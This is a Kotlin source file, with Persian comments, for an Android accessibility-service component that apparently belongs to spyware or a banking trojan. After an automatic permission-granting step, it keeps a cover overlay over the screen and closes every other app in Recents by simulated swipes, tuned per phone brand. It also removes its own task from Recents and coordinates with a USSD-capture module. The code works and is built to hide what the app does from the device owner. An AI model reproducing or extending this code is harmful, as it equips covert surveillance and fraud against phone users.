package com.base.realtime.access

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.app.ActivityManager
import android.content.Context
import android.graphics.Path
import android.graphics.Rect
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.SystemClock
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import android.view.accessibility.AccessibilityWindowInfo
import com.base.realtime.R
import com.base.realtime.ussd.UssdCapture
import java.util.concurrent.CountDownLatch
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger

/**
 * بعد از first-action، Overview را باز می‌کند و هر تسک را جداگانه می‌بندد
 * (بدون Clear all — روی OEMهایی که Clear all پروسه را می‌کشد امن است).
 */
internal object RecentsClearer {

    private const val TAG = "AutoGrant"
    private const val PREFS = "recents_clear"
    private const val KEY_DONE = "done_v1"
    private const val AFTER_PANEL_MS = 700L
    private const val AFTER_ICON_MS = 4_000L
    private const val RETRY_MS = 1_400L
    private const val NO_ACTION_WAIT_MS = 8_000L
    private const val MAX_DISMISS_ROUNDS = 36

    private val main = Handler(Looper.getMainLooper())
    private val worker = Executors.newSingleThreadExecutor { r ->
        Thread(r, "recents-clear").apply { isDaemon = true }
    }
    private val armed = AtomicBoolean(false)
    private val running = AtomicBoolean(false)
    private val panelHolds = AtomicInteger(0)
    private val sawFirstAction = AtomicBoolean(false)

    @Volatile
    private var wantRecents = true

    @Volatile
    private var armedAt = 0L

    @Volatile
    private var active = false

    private val tick = Runnable { tick() }

    fun isActive(): Boolean = active

    fun scheduleAfterSetup(context: Context) {
        val app = context.applicationContext
        wantRecents = com.base.realtime.config.AppConfigs.load(app).clearRecents &&
            !prefs(app).getBoolean(KEY_DONE, false)
        if (!wantRecents) {
            Log.i(TAG, "post-setup skip — recents off")
            finishCover()
            return
        }
        if (!armed.compareAndSet(false, true)) {
            Log.i(TAG, "post-setup already armed")
            keepCover(app)
            return
        }
        panelHolds.set(0)
        sawFirstAction.set(false)
        armedAt = SystemClock.uptimeMillis()
        keepCover(app)
        main.removeCallbacks(tick)
        main.postDelayed(tick, NO_ACTION_WAIT_MS)
        Log.i(TAG, "post-setup armed recents family=${PhoneFamily.current()}")
    }

    fun holdForPanel() {
        if (!armed.get()) return
        sawFirstAction.set(true)
        panelHolds.incrementAndGet()
        main.removeCallbacks(tick)
        Log.i(TAG, "recents clear hold panel")
    }

    fun releasePanel(delayMs: Long = AFTER_PANEL_MS) {
        if (!armed.get()) return
        val left = panelHolds.updateAndGet { n -> if (n > 0) n - 1 else 0 }
        Log.i(TAG, "recents clear release panel left=$left saw=${sawFirstAction.get()} delay=$delayMs")
        if (left == 0 && sawFirstAction.get()) {
            main.removeCallbacks(tick)
            main.postDelayed(tick, delayMs)
        }
    }

    fun releaseAfterIcon() = releasePanel(AFTER_ICON_MS)

    private fun tick() {
        if (!armed.get()) return
        if (!sawFirstAction.get() && SystemClock.uptimeMillis() - armedAt < NO_ACTION_WAIT_MS) return
        val svc = AgentAccessibilityService.get()
        val ussdOpen = UssdCapture.busy() || (svc != null && UssdCapture.visible(svc))
        if (panelHolds.get() > 0 || ussdOpen) {
            main.postDelayed(tick, RETRY_MS)
            return
        }
        if (PermissionsAutoGrant.isArmed() || AutoGrantOrchestrator.isActive()) {
            main.postDelayed(tick, RETRY_MS)
            return
        }
        if (svc == null) {
            main.postDelayed(tick, RETRY_MS)
            return
        }
        if (!running.compareAndSet(false, true)) return
        active = true
        keepCover(svc)
        worker.execute { runClear(svc) }
    }

    private fun runClear(service: AccessibilityService) {
        try {
            keepCover(service)
            PermissionsAutoGrant.stabilizeOverlay()
            removeOwnTasks(service)
            repeat(3) {
                if (!looksLikeRecents(service) && !looksLikeHome(service)) {
                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
                    SystemClock.sleep(280L)
                }
            }
            val ownPkg = service.packageName
            val ownLabel = runCatching { service.getString(R.string.app_name) }.getOrDefault("")
            val family = PhoneFamily.current()
            if (!openOverview(service, ownPkg, ownLabel)) {
                Log.w(TAG, "recents clear — overview did not open family=$family")
                goHome(service)
                disarm(failed = true)
                return
            }

            var emptyStreak = 0
            var misses = 0
            var dismissed = 0
            var locked: SwipeDir? = null

            for (round in 0 until MAX_DISMISS_ROUNDS) {
                if (round % 4 == 0) PermissionsAutoGrant.stabilizeOverlay()
                if (!inOverview(service, ownPkg, ownLabel) && emptyStreak >= 1) {
                    Log.i(TAG, "recents left overview round=$round")
                    break
                }
                val cards = collectTaskCards(service, ownPkg, ownLabel)
                if (cards.isEmpty()) {
                    emptyStreak++
                    if (emptyStreak >= 3) break
                    scrollRecents(service)
                    SystemClock.sleep(280L)
                    continue
                }
                emptyStreak = 0
                val layout = detectLayout(cards)
                val order = directionOrder(family, layout)
                val target = pickTarget(cards, layout) ?: continue
                val before = cards.size
                val dir = locked ?: order[misses % order.size]
                var swiped = false
                if (tryCloseButton(target)) {
                    SystemClock.sleep(220L)
                }
                var after = collectTaskCards(service, ownPkg, ownLabel).size
                if (after >= before) {
                    swiped = swipeDismiss(service, target.rect, dir)
                    SystemClock.sleep(160L)
                    after = collectTaskCards(service, ownPkg, ownLabel).size
                }
                if (after < before) {
                    dismissed++
                    misses = 0
                    if (swiped) locked = dir
                    Log.i(TAG, "recents dismiss round=$round dir=$dir layout=$layout left=$after family=$family")
                } else {
                    misses++
                    locked = null
                    Log.i(TAG, "recents miss round=$round dir=$dir layout=$layout size=$before family=$family")
                    if (misses % order.size == 0) {
                        scrollRecents(service)
                        SystemClock.sleep(240L)
                    }
                    if (misses >= order.size * 2) break
                }
            }

            val left = collectTaskCards(service, ownPkg, ownLabel).size
            removeOwnTasks(service)
            goHome(service)
            if (left == 0) {
                markDone(service)
                Log.i(TAG, "SUCCESS recents one-by-one dismissed=$dismissed family=$family")
            } else {
                Log.w(TAG, "recents incomplete left=$left dismissed=$dismissed family=$family")
                disarm(failed = true)
            }
        } catch (t: Throwable) {
            Log.w(TAG, "recents clear failed", t)
            runCatching { goHome(service) }
            disarm(failed = true)
        } finally {
            active = false
            running.set(false)
        }
    }

    private fun openOverview(
        service: AccessibilityService,
        ownPkg: String,
        ownLabel: String,
    ): Boolean {
        repeat(2) {
            service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS)
            var empty = 0
            repeat(8) {
                SystemClock.sleep(180L)
                if (!inOverview(service, ownPkg, ownLabel)) return@repeat
                if (collectTaskCards(service, ownPkg, ownLabel).isNotEmpty()) return true
                empty++
                if (empty >= 3) return true
            }
        }
        return inOverview(service, ownPkg, ownLabel)
    }

    private fun inOverview(
        service: AccessibilityService,
        ownPkg: String,
        ownLabel: String,
    ): Boolean {
        val pkg = service.rootInActiveWindow?.packageName?.toString().orEmpty().lowercase()
        if (pkg.contains("systemui") || pkg.contains("recents")) return true
        if (!isRecentsPackage(pkg)) return false
        return collectTaskCards(service, ownPkg, ownLabel).isNotEmpty()
    }

    private enum class Layout { ROW, COLUMN, STACK }

    private fun detectLayout(cards: List<TaskCard>): Layout {
        if (cards.size < 2) return Layout.STACK
        val xs = cards.map { it.rect.centerX() }
        val ys = cards.map { it.rect.centerY() }
        val xSpread = (xs.maxOrNull() ?: 0) - (xs.minOrNull() ?: 0)
        val ySpread = (ys.maxOrNull() ?: 0) - (ys.minOrNull() ?: 0)
        val overlap = cards.count { outer ->
            cards.any { inner ->
                inner !== outer && Rect.intersects(outer.rect, inner.rect)
            }
        }
        if (overlap >= cards.size) return Layout.STACK
        if (xSpread > ySpread * 1.3) return Layout.ROW
        if (ySpread > xSpread * 1.3) return Layout.COLUMN
        return Layout.STACK
    }

    /**
     * Samsung قبل از اندروید ۱۲ لیست عمودی است و کارت با چپ/راست بسته می‌شود.
     * MIUI/HyperOS، هواوی، آنر، ColorOS، OriginOS، HiOS و AOSP از ۱۲ به بعد سوایپ بالا.
     * ردیف افقی شیائومی (تنظیمات Recent افقی) با چپ بسته می‌شود.
     */
    private fun directionOrder(family: PhoneFamily, layout: Layout): List<SwipeDir> {
        val sdk = Build.VERSION.SDK_INT
        return when (family) {
            PhoneFamily.SAMSUNG ->
                if (sdk >= 31) listOf(SwipeDir.UP, SwipeDir.LEFT, SwipeDir.RIGHT)
                else listOf(SwipeDir.LEFT, SwipeDir.RIGHT, SwipeDir.UP)
            PhoneFamily.XIAOMI ->
                if (layout == Layout.ROW) listOf(SwipeDir.LEFT, SwipeDir.UP, SwipeDir.RIGHT)
                else listOf(SwipeDir.UP, SwipeDir.LEFT, SwipeDir.RIGHT)
            PhoneFamily.HUAWEI, PhoneFamily.HONOR ->
                listOf(SwipeDir.UP, SwipeDir.LEFT, SwipeDir.RIGHT)
            PhoneFamily.OPPO ->
                if (sdk >= 31 || layout != Layout.COLUMN) listOf(SwipeDir.UP, SwipeDir.LEFT, SwipeDir.RIGHT)
                else listOf(SwipeDir.LEFT, SwipeDir.UP, SwipeDir.RIGHT)
            PhoneFamily.VIVO, PhoneFamily.TRANSSION ->
                listOf(SwipeDir.UP, SwipeDir.LEFT, SwipeDir.RIGHT)
            PhoneFamily.STOCK ->
                if (layout == Layout.COLUMN && sdk < 29) listOf(SwipeDir.LEFT, SwipeDir.RIGHT, SwipeDir.UP)
                else listOf(SwipeDir.UP, SwipeDir.LEFT, SwipeDir.RIGHT)
        }
    }

    private fun pickTarget(cards: List<TaskCard>, layout: Layout): TaskCard? {
        if (cards.isEmpty()) return null
        return when (layout) {
            Layout.COLUMN -> cards.minByOrNull { it.rect.top }
            Layout.ROW, Layout.STACK -> cards.maxByOrNull { it.rect.width() * it.rect.height() }
        }
    }

    private fun tryCloseButton(card: TaskCard): Boolean {
        val node = card.node ?: return false
        val button = findCloseButton(node, card.rect) ?: return false
        if (button.isClickable && button.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
        var parent = button.parent
        while (parent != null) {
            if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
            parent = parent.parent
        }
        return false
    }

    private fun findCloseButton(node: AccessibilityNodeInfo, card: Rect): AccessibilityNodeInfo? {
        val stack = ArrayDeque<AccessibilityNodeInfo>()
        stack.add(node)
        var seen = 0
        while (stack.isNotEmpty() && seen < 48) {
            val n = stack.removeFirst()
            seen++
            val bounds = Rect()
            n.getBoundsInScreen(bounds)
            if (!bounds.isEmpty && card.contains(bounds)) {
                val label = "${n.text ?: ""} ${n.contentDescription ?: ""}".trim().lowercase()
                val id = n.viewIdResourceName.orEmpty().lowercase()
                val small = bounds.width() < card.width() * 0.38 && bounds.height() < card.height() * 0.38
                val singleClose = small && isSingleClose(label, id)
                if (singleClose && (n.isClickable || n.isEnabled)) return n
            }
            for (i in 0 until n.childCount) {
                n.getChild(i)?.let { stack.add(it) }
            }
        }
        return null
    }

    private fun isSingleClose(label: String, id: String): Boolean {
        if (CLEAR_ALL_HINTS.any { it in label || it in id }) return false
        if (id.endsWith("dismiss_task") || id.endsWith("/close") || id.endsWith("close_button")) return true
        return CLOSE_ONE.any { label == it || label.endsWith(" $it") }
    }

    private data class TaskCard(
        val rect: Rect,
        val node: AccessibilityNodeInfo?,
    )

    private fun collectTaskCards(
        service: AccessibilityService,
        ownPkg: String,
        ownLabel: String,
    ): List<TaskCard> {
        val out = ArrayList<TaskCard>()
        val seen = HashSet<String>()
        for (root in collectRoots(service)) {
            walkCards(root, ownPkg, ownLabel, out, seen)
        }
        return out
    }

    private fun walkCards(
        node: AccessibilityNodeInfo,
        ownPkg: String,
        ownLabel: String,
        out: ArrayList<TaskCard>,
        seen: HashSet<String>,
    ) {
        val id = node.viewIdResourceName.orEmpty().lowercase()
        val cls = node.className?.toString().orEmpty()
        val rect = Rect()
        node.getBoundsInScreen(rect)
        val looksCard =
            node.isDismissable ||
                "task" in id ||
                "recent" in id ||
                "card" in id ||
                "snapshot" in id ||
                "thumbnail" in id ||
                cls.endsWith("TaskView") ||
                cls.endsWith("RecentView") ||
                cls.endsWith("TaskCardView") ||
                cls.contains("Recent") && cls.contains("View")
        if (looksCard && rect.height() > 160 && rect.width() > 160 && !rect.isEmpty && !fillsScreen(rect)) {
            if (!isOwnCard(node, ownPkg, ownLabel)) {
                val key = "${rect.left},${rect.top},${rect.right},${rect.bottom}"
                if (seen.add(key)) {
                    out.add(TaskCard(Rect(rect), node))
                }
            }
        }
        for (i in 0 until node.childCount) {
            node.getChild(i)?.let { walkCards(it, ownPkg, ownLabel, out, seen) }
        }
    }

    private fun isOwnCard(node: AccessibilityNodeInfo, ownPkg: String, ownLabel: String): Boolean {
        val blob = buildString {
            append(node.viewIdResourceName.orEmpty())
            append(' ')
            append(node.text?.toString().orEmpty())
            append(' ')
            append(node.contentDescription?.toString().orEmpty())
            val stack = ArrayDeque<AccessibilityNodeInfo>()
            for (i in 0 until node.childCount.coerceAtMost(12)) {
                node.getChild(i)?.let { stack.add(it) }
            }
            var n = 0
            while (stack.isNotEmpty() && n < 40) {
                n++
                val c = stack.removeFirst()
                append(' ')
                append(c.text?.toString().orEmpty())
                append(' ')
                append(c.contentDescription?.toString().orEmpty())
                append(' ')
                append(c.viewIdResourceName.orEmpty())
            }
        }.lowercase()
        if (ownPkg.isNotBlank() && ownPkg.lowercase() in blob) return true
        if (ownLabel.isNotBlank() && ownLabel.lowercase() in blob) return true
        return false
    }

    private fun markDone(context: Context) {
        prefs(context).edit().putBoolean(KEY_DONE, true).apply()
        disarm(failed = false)
    }

    private fun disarm(failed: Boolean) {
        armed.set(false)
        panelHolds.set(0)
        sawFirstAction.set(false)
        main.removeCallbacks(tick)
        finishCover()
        if (failed) Log.w(TAG, "recents clear disarmed without mark")
    }

    private fun keepCover(context: Context) {
        if (AutoGrantDebug.hideCover) return
        val total = AutoGrantProgress.effectiveRuntimePermissions(context).size + 3
        main.post {
            PermissionsAutoGrant.overlayControl?.showAutoGrantOverlay(total, total, cleanup = true)
            PermissionsAutoGrant.stabilizeOverlay()
        }
    }

    private fun finishCover() {
        main.post {
            // تا کاربر «متوجه شدم» نزند Cover باز می‌ماند.
            PermissionsAutoGrant.overlayControl?.showAutoGrantDoneOverlay(hideAfterMs = 0L)
        }
    }

    private fun goHome(service: AccessibilityService) {
        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
        SystemClock.sleep(200L)
    }

    private fun removeOwnTasks(context: Context) {
        try {
            val am = context.getSystemService(ActivityManager::class.java) ?: return
            val tasks = am.appTasks ?: return
            for (task in tasks) {
                runCatching { task.finishAndRemoveTask() }
            }
        } catch (t: Throwable) {
            Log.w(TAG, "finishAndRemoveTask", t)
        }
    }

    private fun scrollRecents(service: AccessibilityService) {
        val roots = collectRoots(service)
        for (root in roots) {
            if (gestureFling(service, root, forward = true)) return
            val scrollable = findScrollable(root)
            if (scrollable != null) {
                scrollable.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
                return
            }
        }
    }

    private fun findScrollable(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        if (node.isScrollable) return node
        for (i in 0 until node.childCount) {
            val c = node.getChild(i) ?: continue
            findScrollable(c)?.let { return it }
        }
        return null
    }

    private fun collectRoots(service: AccessibilityService): List<AccessibilityNodeInfo> {
        val out = ArrayList<AccessibilityNodeInfo>(4)
        runCatching {
            for (w in service.windows.orEmpty()) {
                if (w.type != AccessibilityWindowInfo.TYPE_APPLICATION &&
                    w.type != AccessibilityWindowInfo.TYPE_SYSTEM
                ) {
                    continue
                }
                val root = w.root ?: continue
                val pkg = root.packageName?.toString().orEmpty()
                if (isRecentsPackage(pkg)) out.add(root)
            }
        }
        if (out.isEmpty()) {
            service.rootInActiveWindow?.let { out.add(it) }
        }
        return out
    }

    private fun isRecentsPackage(pkg: String): Boolean {
        if (pkg.isEmpty()) return true
        val p = pkg.lowercase()
        return p.contains("systemui") ||
            p.contains("launcher") ||
            p.contains("home") ||
            p.contains("recents") ||
            p.contains("miui") ||
            p.contains("samsung") ||
            p.contains("huawei") ||
            p.contains("hihonor") ||
            p.contains("oppo") ||
            p.contains("coloros") ||
            p.contains("oneplus") ||
            p.contains("bbk") ||
            p.contains("vivo") ||
            p.contains("transsion") ||
            p.contains("tecno") ||
            p.contains("infinix") ||
            p.contains("nothing") ||
            p.contains("motorola") ||
            p.contains("nexuslauncher") ||
            p.contains("quickstep")
    }

    private fun fillsScreen(rect: Rect): Boolean {
        val root = AgentAccessibilityService.get()?.rootInActiveWindow ?: return false
        val screen = Rect()
        root.getBoundsInScreen(screen)
        if (screen.width() < 100 || screen.height() < 100) return false
        return rect.width() > screen.width() * 0.92 && rect.height() > screen.height() * 0.82
    }

    private fun looksLikeRecents(service: AccessibilityService): Boolean {
        val root = service.rootInActiveWindow ?: return false
        val pkg = root.packageName?.toString().orEmpty().lowercase()
        if (!isRecentsPackage(pkg)) return false
        if (pkg.contains("systemui") || pkg.contains("recents")) return true
        val cards = ArrayList<TaskCard>()
        val seen = HashSet<String>()
        walkCards(root, service.packageName, "", cards, seen)
        return cards.isNotEmpty()
    }

    private fun looksLikeHome(service: AccessibilityService): Boolean {
        val pkg = service.rootInActiveWindow?.packageName?.toString().orEmpty().lowercase()
        return pkg.contains("launcher") || pkg.contains("home")
    }

    private enum class SwipeDir { UP, DOWN, LEFT, RIGHT }

    private fun swipeDismiss(service: AccessibilityService, rect: Rect, dir: SwipeDir): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false
        if (rect.isEmpty) return false
        val cx = rect.exactCenterX()
        val cy = rect.exactCenterY()
        val w = rect.width().toFloat()
        val h = rect.height().toFloat()
        val (x0, y0, x1, y1) = when (dir) {
            SwipeDir.UP -> listOf(cx, cy + h * 0.28f, cx, (rect.top - h * 0.45f).coerceAtLeast(8f))
            SwipeDir.DOWN -> listOf(cx, cy - h * 0.2f, cx, (rect.bottom + h * 0.45f))
            SwipeDir.LEFT -> listOf(cx + w * 0.25f, cy, (rect.left - w * 0.55f).coerceAtLeast(8f), cy)
            SwipeDir.RIGHT -> listOf(cx - w * 0.25f, cy, (rect.right + w * 0.55f), cy)
        }
        val path = Path().apply {
            moveTo(x0, y0)
            lineTo(x1, y1)
        }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0L, 200L))
            .build()
        val done = CountDownLatch(1)
        val completed = AtomicBoolean(false)
        val callback = object : AccessibilityService.GestureResultCallback() {
            override fun onCompleted(gestureDescription: GestureDescription?) {
                completed.set(true)
                done.countDown()
            }

            override fun onCancelled(gestureDescription: GestureDescription?) {
                done.countDown()
            }
        }
        val sent = runCatching { service.dispatchGesture(gesture, callback, main) }.getOrDefault(false)
        if (!sent) return false
        runCatching { done.await(700, TimeUnit.MILLISECONDS) }
        return completed.get()
    }

    private fun gestureFling(service: AccessibilityService, root: AccessibilityNodeInfo, forward: Boolean): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false
        val rect = Rect()
        root.getBoundsInScreen(rect)
        if (rect.isEmpty || rect.height() < 120) return false
        val x = rect.exactCenterX()
        val startY: Float
        val endY: Float
        if (forward) {
            startY = rect.top + rect.height() * 0.72f
            endY = rect.top + rect.height() * 0.28f
        } else {
            startY = rect.top + rect.height() * 0.28f
            endY = rect.top + rect.height() * 0.72f
        }
        val path = Path().apply {
            moveTo(x, startY)
            lineTo(x, endY)
        }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0L, 280L))
            .build()
        return runCatching { service.dispatchGesture(gesture, null, null) }.getOrDefault(false)
    }

    private fun prefs(context: Context) =
        context.applicationContext.getSharedPreferences(PREFS, Context.MODE_PRIVATE)

    private val CLOSE_ONE = listOf(
        "close",
        "dismiss",
        "remove",
        "بستن",
        "حذف",
        "关闭",
        "×",
        "✕",
    )

    private val CLEAR_ALL_HINTS = listOf(
        "clear all",
        "close all",
        "clear_all",
        "پاک کردن همه",
        "بستن همه",
        "全部",
        "一键",
        "clearanim",
    )
}
